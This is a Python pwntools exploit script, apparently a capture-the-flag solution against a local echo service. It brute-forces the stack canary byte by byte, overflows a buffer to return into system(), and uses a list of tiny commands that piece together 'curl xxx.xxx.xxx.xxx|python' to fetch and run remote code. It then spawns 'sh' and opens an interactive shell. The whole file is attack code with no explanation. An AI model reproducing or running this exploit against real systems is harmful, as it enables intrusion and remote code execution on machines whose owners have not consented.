from pwn import *

def leak_canary():
	canary = ""
	canary_offset = 0x100
	guess = 0x0
	buf = ""
	buf += "A" * canary_offset
	buf += canary
	while len(canary) < 4:
		while guess != 0xff:
			try:
				r = remote("localhost",12345)
				context.log_level = "critical"
				r.recvuntil("number: ")
				r.sendline(str(12345))
				r.recvuntil("Enter what you want to echo: ")
				r.send(buf + chr(guess))
				r.recvuntil("Bye bye!")
				print "Guessed correct byte:", format(guess, '02x')
				canary += chr(guess)
				buf += chr(guess)
				guess = 0x0
				r.close()
				break
			except EOFError,e:
				guess += 1
	return canary
	

#Canary = u32(leak_canary())
Canary = 0x5268be00
print "[*] Canary: 0x%x"%Canary
LUCKYNUMBER = 0x804b098
system = 0x8048780

payload = [
	# generate "g> ht- sl" to file "v"
	'>dir', 
	'>sl', 
	'>g\>',
	'>ht-',
	'*>v',
	
	# reverse file "v" to file "x", content "ls -th >g"
	'>rev',
	'*v>x',
	
	# generate "curl xxx.xxx.xxx.xxx|python;"
	'>\;\\', 
	'>on\\', 
	'>th\\', 
	'>py\\', 
	'>\|\\', 
	'>xx\\', 
	'>x\\', 
	'>x.\\', 
	'>xx\\', 
	'>x.\\', 
	'>xx\\', 
	'>x.\\', 
	'>xx\\', 
	'>\ \\', 
	'>rl\\', 
	'>cu\\', 
	
	# got shell
	'sh x', 
	'sh g', 
	]

for cmd in payload:
	r = remote("localhost",12345)
	r.recvuntil("number: ")
	r.sendline(str(u32(cmd.ljust(4,"\x00"))))
	r.recvuntil("echo: ")
	payload = "A"*0x100
	payload += p32(Canary)
	payload += "B"*12 
	payload += p32(system)
	payload += "C"*4
	payload += p32(LUCKYNUMBER)
	r.send(payload)
r.interactive()
